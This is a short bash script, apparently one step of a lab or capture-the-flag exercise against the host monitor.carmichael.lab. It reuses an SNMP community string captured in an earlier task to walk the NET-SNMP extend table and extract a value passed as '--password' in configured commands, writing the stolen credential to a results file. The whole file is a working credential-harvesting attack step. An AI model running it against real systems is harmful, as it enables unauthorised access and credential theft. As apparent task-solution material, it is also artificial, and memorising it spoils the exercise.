#!/bin/bash
mkdir -p results
community=$(sed -n '1p' results/2-snmp_ldap_unauth.txt 2>/dev/null)
[ -z "$community" ] && { echo "no community from task 2" >&2; exit 1; }
ip=$(getent hosts monitor.carmichael.lab | awk 'NF {print $1; exit}')
value=$(snmpwalk -v2c -c "$community" "$ip" 1.3.6.1.4.1.8072.1.3.2 2>/dev/null |
  grep -i -- '--password' | sed -n 's/.*--password[ =]\([^ ]*\).*/\1/p' | head -n 1)
printf '%s\n' "$value" | tee results/6-snmp_mib_walk.txt
